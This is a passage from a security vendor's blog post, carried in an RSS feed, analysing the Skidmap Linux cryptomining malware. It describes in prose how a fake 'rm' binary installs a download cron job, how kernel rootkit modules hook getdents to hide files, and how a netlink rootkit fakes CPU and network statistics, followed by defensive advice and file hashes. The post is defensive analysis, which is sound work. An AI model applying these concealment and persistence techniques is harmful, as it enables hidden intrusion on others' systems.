<li><strong>A fake “rm” binary — </strong>One of the components contained in the tar file is a fake “rm” binary that will replace the original (rm is normally used as command for deleting files). The malicious routine of this file sets up a malicious cron job that would download and execute a file. This routine won’t always be observed, however, as it would only be performed randomly.</li>
<li><strong>kaudited — </strong>A file installed as <em>/usr/bin/kaudited</em>. This binary will drop and install several loadable kernel modules (LKMs) on the infected machine. To ensure that the infected machine won’t crash due to the kernel-mode rootkits, it uses different modules for specific kernel versions. The kaudited binary also drops a watchdog component that will monitor the cryptocurrency miner file and process.</li>
</ul>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-4-1.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-4-1.png" alt="" width="300" /></a></p>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-4-2.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-4-2.png" alt="" width="300" /></a></p>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-4-3.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-4-3.png" alt="" width="300" /></a><br />
Figure 4. Cron job installed by Skidmap’s “rm” (top) and <em>kaudited</em> (middle) dropping the kernel modules; and code snippet of the dropped watchdog component (bottom)</p>
<ul>
<li><strong>iproute</strong> — This module hooks the system call, <em>getdents</em> (normally used to read the contents of a directory) in order to hide specific files.</li>
</ul>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-5-1.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-5-1.png" alt="" width="300" /></a></p>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-5-2.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-5-2.png" alt="" width="300" /></a><br />
Figure 5. Code snippets showing how iproute uses <em>getdents</em> is used to hide certain files (top, center), and how the netlink rootkit fakes network traffic statistics (bottom)</p>
<ul>
<li><strong>netlink </strong>— This rootkit fakes the network traffic statistics (specifically traffic involving certain IP addresses and ports) and CPU-related statistics (hide the “pamdicks” process and CPU load). This would make the CPU load of the infected machine always appear low. This is likely to make it appear as if nothing is amiss to the user (as high CPU usage is a red flag of cryptocurrency-mining malware).</li>
</ul>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-6-1.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-6-1.png" alt="" width="250" /></a></p>
<p align="center"><a href="//blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-6-2.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/skidmap-linux-malware-6-2.png" alt="" width="250" /></a><br />
Figure 6. Snapshots of code showing how the pamdicks process is hidden (top), and how it displays that the CPU load is low (bottom)</p>
<h3><strong>Best practices and Trend Micro solutions</strong></h3>
<p>Skidmap uses fairly advanced methods to ensure that it and its components remain undetected. For instance, its use of LKM rootkits — given their capability to overwrite or modify parts of the kernel — makes it harder to clean compared to other malware. In addition, Skidmap has multiple ways to access affected machines, which allow it to reinfect systems that have been restored or cleaned up.</p>
<p>Cryptocurrency-mining threats don’t just affect a server or workstation’s performance — they could also translate to higher expenses and even disrupt businesses especially if they are used to run mission-critical operations. Given Linux’s use in many enterprise environments, its users, particularly administrators, should always adopt best practices: keep the systems and servers updated and patched (or use <a href="https://www.trendmicro.com/vinfo/us/security/news/security-technology/security-101-virtual-patching">virtual patching</a> for legacy systems); beware of unverified, third-party repositories; and enforce the principle of least privilege to prevent suspicious and malicious executables or processes from running.</p>
<p>Trend Micro solutions powered by <a href="http://go.trendmicro.com/sem/sem/www.trendmicro.com/us/business/xgen/index.html">XGen<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> security</a>, such as <a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint/serverprotect-linux.html">ServerProtect for Linux</a> and <a href="https://www.trendmicro.com/en_us/business/products/network.html?utm_campaign=VURL:www.trendmicro.com&amp;utm_medium=VURL&amp;utm_source=/us/business/cyber-security/index.html">Trend Micro Network Defense</a>, can detect related malicious files and URLs and protect users’ systems. <a href="https://www.trendmicro.com/us/business/complete-user-protection/index.html">Trend Micro Smart Protection Suites</a> and <a href="https://www.trendmicro.com/en_us/small-business/worry-free.html">Trend Micro Worry-Free<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Business Security</a>, which have <a href="https://success.trendmicro.com/solution/1122593-configuring-behavior-monitoring-settings-in-apex-one">behavior monitoring capabilities</a>, can additionally protect from these types of threats by detecting malicious files, thwarting behaviors and routines associated with malicious activities, as well as blocking all related malicious URLs.</p>
<p><em><strong>Indicators of Compromise (IoCs):</strong></em></p>
<table>
<tbody>
<tr>
<td style="text-align: center" width="100"><span style="color: #ff0000"><b>File Name</b></span></td>
<td style="text-align: center" width="280"><span style="color: #ff0000"><strong><span style="text-align: center">SHA-256</span></strong></span></td>
<td style="text-align: center" width="220"><span style="color: #ff0000"><strong><span style="text-align: center">Trend Micro Detection</span></strong></span></td>
</tr>
<tr>
<td style="text-align: left" width="100">crypto514</td>
<td width="280">c07fe8abf4f8ba83fb95d44730efc601<br />
ba9a7fc340b3bb5b4b2b2741b5e31042</td>
<td style="text-align: left" width="220">Rootkit.Linux.SKIDMAP.A</td>
</tr>
<tr>
<td style="text-align: left" width="100">iproute514</td>
<td width="280">3ae9b7ca11f6292ef38bd0198d7e7d0b<br />
bb14edb509fdeee34167c5194fa63462</td>
<td style="text-align: left" width="220">Rootkit.Linux.SKIDMAP.A</td>
</tr>
<tr>
<td style="text-align: left" width="100">kaudited</td>
<td width="280">e6eb4093f7d958a56a5cd9252a4b529<br />
efba147c0e089567f95838067790789ee</td>
<td style="text-align: left" width="220">Trojan.Linux.SKIDMAP.UWEJY</td>
</tr>
<tr>
<td style="text-align: left" width="100">kswaped</td>
<td width="280">240ad49b6fe4f47e7bbd54530772e5d2<br />
6a695ebae154e1d8771983d9dce0e452</td>
<td style="text-align: left" width="220">Backdoor.Linux.SKIDMAP.A</td>
</tr>
<tr>
<td style="text-align: left" width="100">netlink514</td>
<td width="280">945d6bd233a4e5e9bfb2d17ddace46f2<br />
b223555f60f230be668ee8f20ba8c33c</td>
<td style="text-align: left" width="220">Rootkit.Linux.SKIDMAP.A</td>
</tr>
<tr>
<td style="text-align: left" width="100">systemd_network</td>
<td width="280">913208a1a4843a5341231771b66bb400<br />
390bd7a96a5ce3af95ce0b80d4ed879e</td>
<td style="text-align: left" width="220">Trojan.Linux.SKIDMAP.A</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong><em>Additional insights and analysis by Wilbert Luy</em></strong></p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/">Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=tQI97b4fF4Q:dNb-kbRYcKQ:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=tQI97b4fF4Q:dNb-kbRYcKQ:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=tQI97b4fF4Q:dNb-kbRYcKQ:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=tQI97b4fF4Q:dNb-kbRYcKQ:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=tQI97b4fF4Q:dNb-kbRYcKQ:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=tQI97b4fF4Q:dNb-kbRYcKQ:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=tQI97b4fF4Q:dNb-kbRYcKQ:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=tQI97b4fF4Q:dNb-kbRYcKQ:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=tQI97b4fF4Q:dNb-kbRYcKQ:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=tQI97b4fF4Q:dNb-kbRYcKQ:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/tQI97b4fF4Q" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/</feedburner:origLink></item>
	</channel>
</rss>
